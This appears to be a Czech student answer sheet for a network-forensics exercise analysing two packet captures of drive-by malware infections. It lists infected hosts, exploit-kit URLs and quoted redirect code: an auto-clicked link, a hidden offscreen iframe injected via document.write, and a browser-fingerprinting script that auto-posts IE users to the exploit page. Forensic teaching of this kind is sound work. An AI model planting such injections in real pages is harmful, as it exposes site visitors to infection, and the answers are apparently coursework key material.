# Zadání první části – soubor uloha1.pcap

### 1. Jaká je IP adresa stanice, která byla infikována?

```
127.80.179.181
```

### 2. Jaký prohlížeč infikovaná stanice používala?

Internet Explorer 8.0

User-Agent:
```
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729)
```

### 3. Jaká je URL, ze které byl exploit stažen?

```
http://static.this-is-not-a-botnet.com/3h251q2c35
```

### 4. Jaká je URL webové stránky, ze které se stanice dostala na URL s exploitem?

```
http://akronkappas.com//d2a42e1f7d9a1021bd7d93af414c95c4.php?q=70a9b40eb73da11445c3a3609c8241d9
```

### 5. Jakým způsobem došlo k přesměrování na externí URL se škodlivým kódem?

```
<a id='myLink' href='http://static.this-is-not-a-botnet.com/3h251q2c35'>click</a><script>document.getElementById('myLink').click();</script>
```

# Zadání druhé části – soubor uloha2.pcap

### 1. Která URL adresa (uveďte alespoň doménu) způsobila infekci stanice?

```
http://tyu.benme.com/%3fct=Vivaldi&biw=Vivaldi.95ec76.406i7c5k7&oq=h8fItKeRVawGyjRaFcw1nyYdeAwgQ8_qtiEKBzBKfgZ6D-hyMZAh1z6LRVvQ42w&tuif=2320&q=wH7QMvXcJwDNFYbGMvrER6NbNknQA0KPxpH2_drZdZqxKGni2Ob5UUSk6FqCEh3&yus=Vivaldi.114tq57
```

### 2. Jak se uživatel dostal na danou doménu?

`http://retrotip.visionurbana.com.ve/dle_js.js`

```
document.write('<div class="" style="position:absolute; width:383px; height:368px; left:17px; top:-858px;">  <div  style="" class=""><a>head</a><a class="head-menu-2"> </a><iframe src="http://tyu.benme.com/?q=zn_QMvXcJwDQDofGMvrESLtEMUbQA0KK2OH_76iyEoH9JHT1vrTUSkrttgWC&biw=Amaya.81lp85.406f4y5l9&oq=elTX_fUlL7ABPAuy2EyALQZnlY0IU1IQ8fj630PWwUWZ0pDRqx29UToBvdeW&yus=Amaya.110oz60.406a7e5q8&br_fl=4109&tuif=5364&ct=Amaya" width=290 height=257 ></ifr' +'ame> <a style=""></a></div><a class="" style="">temp</a></div>');
```

### 3. Samotný malware je uložen na jiné (externí) URL adrese. Jaká je to adresa?

```

```

### 4. Jakým způsobem došlo k přesměrování na externí URL se škodlivým kódem?

```

```

alebo

```
var NormalURL = 'http://tyu.benme.com/?oq=CEh3h8_svK7pSP1LgiRbVcgU3n45bWw8S_6qviBCBmBWUhcSHrxLeNwt1z6I&q=wH7QMvXcJwDIFYbGMvrETKNbNknQA06PxpH2_drZdZqxKGni0ub5UUSk6Fy&tuif=5921&br_fl=5828&biw=Vivaldi.82ss74.406q9e2t1&yus=Vivaldi.80lf74.406f5d1w2&ct=Vivaldi';


function start() {
	BrowserInfo = getBrowser();

	if(BrowserInfo.is_bot == true) {
		document.write('');		
			} else {
      if(BrowserInfo.browser_real=='ie') {
		    window.frames[0].document.body.innerHTML = '<form target="_parent" method="post" action="'+NormalURL+'"></form>'; 
		    window.frames[0].document.forms[0].submit();
      }
	}
	
}
```
